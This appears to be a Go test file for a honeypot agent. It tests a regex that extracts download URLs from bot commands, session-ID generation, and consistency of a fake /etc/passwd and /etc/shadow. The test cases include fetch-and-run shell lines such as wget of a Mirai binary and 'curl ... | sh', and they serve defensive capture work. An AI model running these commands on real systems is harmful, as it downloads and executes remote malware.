package services

import (
	"encoding/hex"
	"strings"
	"testing"

	"honeypot-agent/internal/vfs"
)

// urlRegex pulls the download URL out of typical bot lines and stops at shell separators and quotes.
func TestURLRegex(t *testing.T) {
	tests := []struct {
		line string
		want string
	}{
		{"wget http://203.0.113.7/bins/mirai.arm7", "http://203.0.113.7/bins/mirai.arm7"},
		{"cd /tmp; wget http://203.0.113.7/x.sh; sh x.sh", "http://203.0.113.7/x.sh"},
		{"curl -s https://example.com/a.sh|sh", "https://example.com/a.sh"},
		{"busybox wget 'http://example.com/b'&&chmod +x b", "http://example.com/b"},
		{`curl "http://example.com/c"`, "http://example.com/c"},
		{"ftpget -v -u anonymous ftp://example.com/x", "ftp://example.com/x"},
		{"busybox tftp tftp://203.0.113.7/bot", "tftp://203.0.113.7/bot"},
		{"cat /proc/cpuinfo", ""},
	}
	for _, tt := range tests {
		if got := urlRegex.FindString(tt.line); got != tt.want {
			t.Errorf("%q: got %q, want %q", tt.line, got, tt.want)
		}
	}
}

// newSessionID: 16 hex characters, a different one every time.
func TestNewSessionID(t *testing.T) {
	seen := map[string]bool{}
	for i := 0; i < 1000; i++ {
		id := newSessionID()
		if _, err := hex.DecodeString(id); err != nil || len(id) != 16 {
			t.Fatalf("bad session id: %q", id)
		}
		if seen[id] {
			t.Fatalf("session id %q came out twice", id)
		}
		seen[id] = true
	}
}

// Persona rule: every user that can log in must be in the fake /etc/passwd with uid 0 and in
// /etc/shadow. Otherwise `cat /etc/passwd` right after a successful login gives us away.
func TestLoginUsersExistInFakeSystem(t *testing.T) {
	passwd, _ := vfs.NewShell().Run("cat /etc/passwd")
	shadow, _ := vfs.NewShell().Run("cat /etc/shadow")

	for credential := range weakCredentials {
		user, _, _ := strings.Cut(credential, ":")
		// "\n" in front so "root" can't match the end of another name, and the first line counts too
		if !strings.Contains("\n"+passwd, "\n"+user+":x:0:0:") {
			t.Errorf("user %q is missing from the fake /etc/passwd (or doesn't have uid 0)", user)
		}
		if !strings.Contains("\n"+shadow, "\n"+user+":") {
			t.Errorf("user %q is missing from the fake /etc/shadow", user)
		}
	}
}
